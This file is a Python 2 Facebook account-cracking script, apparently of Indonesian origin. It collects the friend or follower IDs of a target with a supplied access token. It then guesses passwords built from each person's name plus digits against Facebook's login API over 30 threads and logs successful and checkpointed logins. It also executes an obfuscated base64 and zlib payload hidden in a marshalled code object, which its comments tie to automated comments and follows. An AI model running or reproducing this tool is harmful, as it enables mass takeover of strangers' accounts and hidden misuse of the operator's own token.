#-*-coding:utf-8-*-
import os,sys,time,random,hashlib,re,threading,json,urllib,cookielib,requests,uuid,datetime
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import date 
reload(sys) 
sys.setdefaultencoding('utf8')
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

def jeeck(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

loop = 0
id = []
cp = []
ok = []

# Pastikan Jangan Ubah Bot Komen & Follownya :v #
ua = ('Lenovo-A850/S105 Linux/3.4.0 Android/4.2 Release/06.12.2013 Browser/AppleWebKit534.30 Profile/ Configuration/ Safari/534.30')
# Cek hasil okeh
def __hasil_ok_cp__():
	jeeck("\n \033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Lihat hasil ok")
	jeeck(" \033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Lihat hasil cp")
	jeeck(" \033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Exit")
	has = raw_input("\n \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
	if has == '':
		exit(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk input")
	elif has == '1':
		hasil_ok = open('Ok.json','r').read()
		print(hasil_ok)
		exit()
	elif has == '2':
		hasil_cp = open('Cp.json','r').read()
		print(hasil_cp)
		exit()
	elif has == '3':
		___naruto___()
	else:
		exit(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk input")
# Jangan Di Ganti # Kalo Mau Tambahin Aja #

komenredem = random.choice(['Bang Lu Ngntd!', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'Siang Panen Pahala Malam Panen Kepala', 'Arigato Atas Scnya Bang', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc cr4ck Lu Bang ', 'Wih Panutan Gua Nih', 'Senseii Kawaiine'])
komtwol = random.choice(['Salam 2 Jari Bang', 'Mantap Sensei', 'bang lu kgk punya pacar?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Gua Pengin Jadi Kek Abang', 'Semoga Abang Jadi Orang Sukses', 'Bjir Lawack Kali Kau Bang'])
kartu2d = random.choice(["pacaran kok sama 2D\nsampah bat lu bang","waduh sampah lu bang","wibu hengker tezy","judul anime apa bang?","bjir kawai cok","bang lapor gua habis coli","neper surentod","kentod berkentod :v"])
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJyVU21r20AM1jnvfdlrIZR+yfZh+MvitG7iZV3WQdkbgw7awUrDMK7vmiaOfdmdvCWQwKD7Jftp+yXTOc1GR7tRG+kknfRId9KFcPExohdE+hYxDvAd4JgEBocV2yJTaJwKF7RnHMsUMlkHzLy4BecWDBicA8wAPiYu5NGCaAnUPjDGeA5ev8EcDPLA83DOgGEBsAiDkokwesLgCMswY4AVmFmASzDLAS/ALA+4DIMV4EWY5qHKS1CdMlrLtAJUM7C5QwWu2ViCae66COtmUMvw27Bqamd0WYf2Ct3Ivq4QH8peP6njGNFcqdIe8Y1uY6fdirPFi2vdje7mjtuKf377kUle/Kn2QUYicfakjPqi1k++BMM+13cMQlx7rE5rf2Bvk7HpudtNr9nwGk/c7fam3iDbGeJIP3WcngpGZ/XTIBQnhFYPZezo+7TvkBSLBLWzGwutg57oZM1+FIQh6T6aCjq682+ovzJfBfofhM1Go+FuNT3PbbfcdvMqhHc3q2HYj4Te1WkcB2rSQZWKy2eyzTExT0yOKJMRlAg4lkh4+/6lUlKhmXGpaSJpsicaRZy5iXEfqe8A/kCIMBonQSKxsOgyjShAJKl6JThFlOYqfpXDuRwoTLc4TbVJ+DkVGnUGO6JMaEbG9/0kUClKEmyDm4FnVdNjmaOVF0mQ4AzsRKJOT4IDcyobFizrpaN5GCjuvFJpfTTBe/MUWe3+kW+qJ9XMpX6YPfocW2errEC0xooX/wOy0W+t5+4W923jfLB2KdO16Uylz2LJ06F4buLQOP4C0/f8gw==', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()


def __naruto_X_nano__():
	os.system('clear')
	print(_jeeck_banner_)
	jeeck("\n \033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Token fb ")
	jeeck(" \033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Dump token")
	jeeck(" \033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Exit")
        masuk = raw_input("\n \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
        if masuk == "":
                exit(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk input")
        elif masuk == "1":
		token = raw_input(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token : ")
		try:
                	y = requests.get('https://graph.facebook.com/me?access_token='+token)
	                x = json.loads(y.text)
	                nama = x['name']
	                save = open("login.txt", 'w')
	                save.write(token)
	                save.close()
	                ___jeeck_X_nano___()
	        except KeyError:
			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token invallid")
	                time.sleep(3)
	                __naruto_X_nano__()
	        except requests.exceptions.SSLError:
	                exit(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token Invallid")
        elif masuk == "2":
		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Anda akan diarahkan ke web")
                time.sleep(3)
		os.system("xdg-open https://youtu.be/KWVro6bGdXw")
                exit()
        elif masuk == "0":
                exit()
        else:
		exit(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk input")
_jeeck_banner_ = ("""
\033[0;36m   _____ _                 __   
\033[0;36m  / ___/(_)___ ___  ____  / /__     \033[0;33m•\033[0;00m 𝘊𝘖𝘋𝘌 𝘉𝘠 VIKO 𝘟 FARHAN \033[0;33m•
\033[0;36m  \__ \/ / __ `__ \/ __ \/ / _ \ \033[0;33m•\033[0;00m 𝘏𝘛𝘛𝘗𝘚://𝘎𝘐𝘛𝘏𝘜𝘉.𝘊𝘖𝘔/VikoGanz \033[0;33m•
\033[0;36m ___/ / / / / / / / /_/ / /  __/
\033[0;36m/____/_/_/ /_/ /_/ .___/_/\___/ 
\033[0;33m  VIKO 𝚇 FARHAN  \033[0;36m/_/             """)

# Oi memex ini menu yah
def ___naruto___():
        try:
                token = open('login.txt','r').read()
        except IOError:
		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token invallid")
                os.system('rm -rf login.txt')
		time.sleep(2)
                __naruto_X_nano__()
        try:
                p = requests.get('https://graph.facebook.com/me?access_token=' +token)
                q = json.loads(p.text)
                name = q['name']
		birthday = q['birthday']
        except KeyError:
		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token invallid")
                os.system('rm -rf login.txt')
		time.sleep(3)
		__naruto_X_nano__()
        except requests.exceptions.ConnectionError:
		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Tidak ada koneksi internet");exit
        os.system('clear')
	print(_jeeck_banner_)
	print("\n \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Nama account : " +name)
	print(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Tanggal lahir : "+birthday)
	jeeck("\n \033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Crack id dari publik")
	print(" \033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Crack id dari followers")
	print(" \033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Chek pwx crack")
	jeeck(" \033[0;36m[\033[0;35m00\033[0;36m]\033[0;00m Remove [ TOKEN ]")
	_naruto_kurama_ = raw_input("\n \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
	if _naruto_kurama_ == "":
		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk input ");exit
	elif _naruto_kurama_ == "1" or _naruto_kurama_ == "01":
		idt = raw_input(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target : ")
		try:
			token=open('login.txt','r').read()
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Nama : "+sp["name"])
		except KeyError:
			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target tidak ditemukan");exit
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			id.append(uid)
	elif _naruto_kurama_ == "2" or _naruto_kurama_ == "02":
		idt = raw_input(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target : ")
		try:
			token=open('login.txt','r').read()
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Nama : "+sp["name"])
		except KeyError:
			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target tidak di temukan");exit
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			id.append(uid)
	elif _naruto_kurama_ == "3" or _naruto_kurama_ == "03":
		__hasil_ok_cp__()
	elif _naruto_kurama_ == "0" or _naruto_kurama_ == "00":
		os.system("rm -f login.txt")
		time.sleep(3)
		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Terimakasih telah terhubung di tools saya");exit
	else:
		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk input");exit
	jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Total id : "+str(len(id)))
	print(' ')
	def main(arg):
		global ok,cp,ua, loop
		pwx = []
		_naruto_x_xnxcode_ = random.choice(['\033[0;33m','\033[0;36m','\033[0;90m','\033[0;35m','\033[0;31m','\033[0;00m'])
		print _naruto_x_xnxcode_+'\r [%s] %s/%s [Ok:%s] - [Cp:%s] ' % (datetime.now().strftime('%H:%M:%S'),loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		uid = arg
		try:
			d = requests.get('https://graph.facebook.com/'+uid+'/?access_token='+token)
	                v = json.loads(d.text)
			nama = v['name']
			first = v['first_name']
			last = v['last_name']
			pwx.append(nama)
			pwx.append(first+'123')
			pwx.append(first+'1234')
			pwx.append(first+'12345')
			pwx.append(first+'123456')
			pwx.append(last+'123')
			pwx.append(last+'1234')
			pwx.append(last+'12345')
			pwx.append(last+'123456')
			for pw in pwx:
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua,
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[1;92m[Ok] '+uid+'|'+pw+'        '
					ok.append(uid+'|'+pw)
					save = open('Ok.json','a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					print '\r\033[1;93m[Cp] '+uid+'|'+pw+'|'+nama
					cp.append(uid+'|'+pw)
					save = open('Cp.json','a')
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Cracking Finised ");exit

if __name__=='__main__':
	os.system('git pull')
	___naruto___()
